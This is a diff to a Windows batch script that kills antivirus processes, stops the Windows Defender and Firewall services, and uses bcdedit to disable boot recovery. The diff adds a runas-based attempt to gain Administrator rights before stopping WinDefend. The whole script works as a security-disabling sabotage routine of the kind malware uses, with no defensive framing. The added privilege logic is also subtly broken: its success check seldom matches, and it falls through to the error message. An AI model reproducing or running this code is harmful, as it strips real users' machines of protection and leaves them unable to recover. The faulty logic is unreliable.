@@ -138,9 +138,33 @@ tskill /A avas*
 tskill /A norm*
 cls
 tskill /A offg*
+if not "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITECTURE%"=="x86" goto error
+if "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITEW6432%"=="" goto error
+if "%PROCESSOR_ARCHITECTURE%"=="x86" if "%PROCESSOR_ARCHITEW6432%"=="" goto error
+
+setlocal EnableDelayedExpansion
+set "batchPath=%~0"
+set "batchPath=!batchPath:\=\\!"
+for /f "tokens=*" %%a in ('%SystemRoot%\System32\cmd.exe /c %SystemRoot%\System32\runas.exe /env /user:Administrator "%batchPath%"') do (
+    set "result=%%a"
+)
+if "%result%" == "SUCCESS: The operation completed successfully." (
+    goto start
+) else (
+    goto error
+)
+
+:start
+rem Stop the Windows Defender service
+sc stop WinDefend
+
+echo The Windows Defender service has been stopped.
+
+:error
+echo You do not have sufficient privileges to stop the Windows Defender service.
+
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
-sc stop WinDefend
 bcdedit /set {default} bootstatuspolicy ignoreallfailures
 bcdedit /set {default} recoveryenabled No
 cls
